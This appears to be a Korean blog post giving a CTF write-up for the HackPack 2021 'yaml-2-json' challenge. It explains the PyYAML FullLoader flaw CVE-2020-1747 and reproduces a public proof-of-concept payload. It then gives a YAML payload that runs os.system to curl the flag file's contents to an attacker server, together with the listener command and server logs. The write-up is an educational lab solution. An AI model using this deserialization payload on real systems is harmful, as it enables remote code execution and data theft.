---
title: "[2021 HackPack CTF] Yaml-2-Json writeup"
categories:
  - CTF
author_profile: true
---

**2021 hackpack ctf - yaml-2-json writeup**

- PyYaml 취약점 `CVE-2020-1747`

---

# `page view`

![image](https://user-images.githubusercontent.com/44183111/115112242-95756200-9fbf-11eb-8cae-163d382c7f4e.png)

- 해당 페이지는 `yaml` 문법을 `json` 으로 변환하는 기능을 한다.
- `untrusted input`에 대한 검증을 하는가가 핵심 분석 포인트

---

# `CVE-2020-1747`

 A vulnerability was discovered in the `PyYAML` library in versions before `5.3.1`, where it is susceptible to arbitrary code execution when it processes untrusted YAML files through the full_load method or with the FullLoader loader. Applications that use the library to process untrusted input may be vulnerable to this flaw. An attacker could use this flaw to execute arbitrary code on the system by abusing the python/object/new constructor.

---

# `proof of concept`

- https://gist.github.com/adamczi/23a3b6d4bb7b2be35e79b0667d6682e1

```python
# pyyaml==5.3 required. Vulnerability has been fixed in 5.3.1
# More: ret2libc's report in https://github.com/yaml/pyyaml/pull/386
# Explanation: https://2130706433.net/blog/pyyaml/
from yaml import *

with open('payload.yaml','rb') as f:
  content = f.read()

data = load(content, Loader=FullLoader) # Using vulnerable FullLoader

```

```yaml
# The `extend` function is overriden to run `yaml.unsafe_load` with 
# custom `listitems` argument, in this case a simple curl request

- !!python/object/new:yaml.MappingNode
  listitems: !!str '!!python/object/apply:subprocess.Popen [["curl", "http://127.0.0.1/rce"]]'
  state:
    tag: !!str dummy
    value: !!str dummy
    extend: !!python/name:yaml.unsafe_load
```

---

# `exploit`

- 해당 취약점을 이용하여 `Remote Code Execution` 을 통해 플래그를 얻어낼 것이다.
- 우선, 임의의 서버에서 `python3 http.server` 로 리퀘스트를 받을 수 있도록 한다.

``` bash
python3 -m http.server 3000
```

<br/>

- `exploit` 코드는 아래와 같다.

``` yaml
"parkmin": !!python/object/apply:os.system ["curl http://myserver.com:3000/?`cat /tmp/flag.txt`"]
```

<br/>

- 서버에서 확인해보면 플래그를 확인할 수 있다.

``` bash
152.14.92.89 - - [16/Apr/2021 18:06:26] "GET /? HTTP/1.1" 200 -
152.14.92.89 - - [16/Apr/2021 18:06:33] "GET /? HTTP/1.1" 200 -
152.14.92.89 - - [16/Apr/2021 18:06:47] "GET /?flagPy_PyYaml_Yaml_Py HTTP/1.1" 200 -
152.14.92.89 - - [16/Apr/2021 18:07:07] "GET /?flagPy_PyYaml_Yaml_Py HTTP/1.1" 200 -
```

<br/>

`flag{Py_PyYaml_Yaml_Py}`

---
